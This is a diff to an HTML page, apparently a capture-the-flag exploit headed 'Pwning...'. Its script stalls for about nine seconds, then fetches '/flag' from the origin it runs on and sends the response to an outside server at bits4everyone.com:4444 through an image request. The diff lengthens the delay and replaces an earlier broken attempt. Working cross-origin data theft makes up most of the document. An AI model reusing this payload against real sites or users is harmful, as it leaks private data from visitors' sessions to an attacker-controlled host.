@@ -3,16 +3,13 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
-    <h1>Pwning...</h1>
-    <script type="text/javascript">    
+    <script type="text/javascript">   
+        document.write('<h1>Pwning...</h1>');
         var date = new Date();
         var curDate = null;
         do { curDate = new Date(); }
-        while(curDate-date < 7000);
-
-        var flagImg = new Image();
-        image.src = 'flag';
-        document.body.appendChild(flagImg);
+        while(curDate-date < 9000);
+        document.write('<h1>Time</h1>');
         $.get('/flag', function(data) {
             var image = new Image();
             image.src='http://bits4everyone.com:4444?data='+data;
